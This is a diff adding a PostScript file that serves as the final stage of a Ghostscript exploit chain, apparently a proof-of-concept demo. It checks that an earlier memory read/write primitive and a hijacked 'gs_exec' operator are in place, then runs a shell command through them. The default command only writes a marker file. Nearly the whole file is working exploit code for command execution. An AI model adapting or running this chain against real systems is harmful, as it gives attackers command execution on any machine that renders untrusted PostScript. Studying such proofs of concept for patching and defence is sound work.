@@ -1,0 +1,27 @@
+%
+% Demo terminal tail: run after library_v2.ps + exploit.ps.
+%
+% Success is the marker file on the mounted /work path.  Ghostscript may die
+% after gs_exec because the stdout function-pointer hijack is terminal.
+%
+
+currentdict /demo_gs_exec_cmd known not {
+  /demo_gs_exec_cmd (echo gs_exec_ok >/work/gs_exec_marker) def
+} if
+
+demo_gs_exec_cmd type /stringtype ne {
+  (FAIL: demo_gs_exec_cmd must be a string\n) print flush quit
+} if
+
+rw_ready not {
+  (FAIL: rw_init did not activate the seam\n) print flush quit
+} if
+
+currentdict /gs_exec known not {
+  (FAIL: gs_exec is missing\n) print flush quit
+} if
+currentdict /gs_exec get xcheck not {
+  (FAIL: gs_exec is not executable\n) print flush quit
+} if
+
+demo_gs_exec_cmd gs_exec
